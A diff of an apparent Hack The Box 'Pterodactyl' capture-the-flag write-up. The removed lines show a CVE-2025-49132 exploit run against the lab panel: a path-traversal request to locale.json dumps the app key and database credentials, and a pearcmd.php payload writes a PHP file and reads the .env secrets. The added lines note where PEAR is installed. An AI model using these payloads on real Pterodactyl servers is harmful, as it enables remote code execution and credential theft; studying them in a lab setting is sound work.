@@ -369,79 +369,15 @@ http://panel.pterodactyl.htb/ => pterodactyl:PteraPanel@127.0.0.1:3306/panel
 
 it is already done : sad life
 
-https://github.com/str1keboo/CVE-2025-49132
+On many Linux servers, PEAR is installed at:
 
 ```
-(venv) ajdev@rootbox:~/CVE-2025-49132$ python3 CVE-2025-49132-PoC.py test http://panel.pterodactyl.htb
-[+] Target appears vulnerable (Path: ../../../pterodactyl)
-(venv) ajdev@rootbox:~/CVE-2025-49132$ python3 CVE-2025-49132-PoC.py dump http://panel.pterodactyl.htb
-\[*] Attempting dump: http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/app
+/usr/share/php/PEAR
 
-[SUCCESS] App Configuration Found:
-NAME      : Pterodactyl
-ENV       : production
-DEBUG     :
-URL       : http://panel.pterodactyl.htb
-KEY       : base64{{UaThTPQnUjrrK61o}}+Luk7P9o4hM+gl4UiMJqcbTSThY=
-CIPHER    : AES-256-CBC
+PEAR includes:
+pearcmd.php
 
-[+] APP_KEY ready for session forgery
 
-[*] Attempting dump: http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database
-
-[SUCCESS] Database Credentials Found:
-URI: pterodactyl:PteraPanel@127.0.0.1:3306/panel
-(venv) ajdev@rootbox:~/CVE-2025-49132$ \python3 CVE-2025-49132-PoC.py exploit http://panel.pterodactyl.htb --os linux
-[+] Target appears vulnerable (Path: ../../../pterodactyl)
-[*] Sending exploit: http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../usr/local/lib/php&namespace=pearcmd&/%3C%3Fphp%20sleep%285%29%3B%20%3F%3E+/tmp/payload.php'; echo
-[*] Verifying RCE (5s delay)...
-[-] RCE Failed.
-```
-
-[https://cvefeed.io/vuln/detail/CVE-2025-49132]
-
-```
-ajdev@rootbox:~/HTB/Pterodactyl$ python3 exploit.py --host panel.pterodactyl.htb --command "cat /var/www/pterodactyl/.env"
-
-╔═══════════════════════════════════════════════════════════╗
-║           CVE-2025-49132 PEAR RCE Exploit                ║
-║           Target: panel.pterodactyl.htb                       ║
-╚═══════════════════════════════════════════════════════════╝
-
-[*] Target: http://panel.pterodactyl.htb
-[*] PEAR Path: ../../../../../../usr/share/php/PEAR
-[*] Command: cat /var/www/pterodactyl/.env
-
-[*] Writing payload to /tmp/shell.php...
-[+] Payload written
-[*] Executing payload...
-[+] Command executed successfully!
-
-============================================================
-OUTPUT:
-============================================================
-#PEAR_Config 0.9
-a:13:{s:7:"php_dir";s:123:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/APP_ENV=production
-APP_DEBUG=false
-APP_KEY=base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
-APP_THEME=pterodactyl
-APP_TIMEZONE=UTC
-APP_URL="http://panel.pterodactyl.htb"
-APP_LOCALE=en
-APP_ENVIRONMENT_ONLY=false
-
-LOG_CHANNEL=daily
-LOG_DEPRECATIONS_CHANNEL=null
-LOG_LEVEL=debug
-
-DB_CONNECTION=mysql
-DB_HOST=127.0.0.1
-DB_PORT=3306
-DB_DATABASE=panel
-DB_USERNAME=pterodactyl
-DB_PASSWORD=PteraP
-============================================================
-ajdev@rootbox:~/HTB/Pterodactyl$
 ```
 
 
